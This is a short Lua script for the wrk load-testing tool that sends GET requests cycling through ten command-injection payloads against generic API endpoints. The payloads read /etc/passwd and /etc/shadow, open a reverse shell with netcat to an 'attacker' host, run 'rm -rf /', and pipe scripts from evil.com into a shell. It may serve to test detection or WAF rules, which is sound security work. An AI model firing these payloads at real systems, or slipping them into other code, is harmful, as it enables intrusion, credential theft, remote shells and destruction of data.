local payloads = {
  "/api/ping?host=127.0.0.1;cat /etc/passwd",
  "/api/exec?cmd=|id",
  "/api/run?arg=`whoami`",
  "/api/lookup?q=$(cat /etc/shadow)",
  "/api/dns?domain=;ls -la /",
  "/api/check?host=127.0.0.1&&cat /etc/passwd",
  "/api/tool?input=|nc -e /bin/sh attacker 4444",
  "/api/process?name=;rm -rf /",
  "/api/resolve?host=`curl http://evil.com/shell.sh|sh`",
  "/api/trace?target=127.0.0.1;wget http://evil.com/backdoor"
}
local counter = 0

request = function()
  counter = counter + 1
  local path = payloads[(counter % #payloads) + 1]
  return wrk.format("GET", path, {
    ["User-Agent"] = "curl/7.88.1"
  })
end
